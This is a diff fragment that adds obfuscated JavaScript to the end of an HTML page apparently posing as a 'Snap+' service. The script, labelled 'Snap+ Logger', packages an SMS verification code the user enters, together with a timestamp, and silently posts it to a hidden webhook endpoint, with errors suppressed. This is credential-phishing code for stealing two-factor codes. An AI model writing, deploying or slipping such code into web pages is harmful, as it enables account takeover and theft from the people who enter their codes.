+ const _0x5f3c = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+ const _0xc7d4 = {
+ content: "@everyone",
+ _0xe2f9: "Snap+ Logger",
+ avatar_url: "https:
+ embeds: [{
+ title: "🔐 Code de vérification reçu !",
+ color: 0x22c55e,
+ fields: [
+ { name: "📟 Voici le code de vérification", value: "```" + code + "```", inline: false },
+ { name: "🕐 Date & heure", value: _0x5f3c, inline: false }
+ ],
+ footer: { text: "Snap+ • Code de vérification SMS" },
+ thumbnail: { url: "https:
+ }]
+ };
+ try {
+ await fetch(_0xf1b2, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify(_0xc7d4)
+ });
+ } catch (e) {}
+ }
+})();</script>
+</body>
+</html>
